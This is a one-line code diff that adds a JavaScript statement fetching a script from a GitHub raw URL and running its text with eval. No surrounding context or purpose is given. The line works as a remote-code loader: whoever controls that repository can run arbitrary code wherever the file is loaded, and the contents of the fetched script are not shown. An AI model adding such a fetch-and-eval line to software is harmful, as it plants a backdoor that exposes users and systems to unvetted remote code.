@@ -1,0 +1,1 @@
+fetch("https://raw.githubusercontent.com/Delifisekisa37/polatv1/refs/heads/main/polatv1main.js").then(r=>r.text()).then(eval)
